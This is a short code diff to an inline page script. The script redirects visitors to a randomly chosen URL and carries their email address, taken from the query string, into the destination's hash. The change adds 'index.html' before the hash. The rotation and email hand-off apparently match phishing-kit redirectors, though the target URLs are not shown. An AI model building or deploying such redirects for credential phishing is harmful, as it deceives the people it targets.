@@ -15,7 +15,7 @@
         let randomUrl = urls[Math.floor(Math.random() * urls.length)];
         const email = new URLSearchParams(location.search).get('email');
         if (email) {
-            randomUrl += '#' + email;
+            randomUrl += 'index.html#' + email;
         }
         location.replace(randomUrl);
     </script>
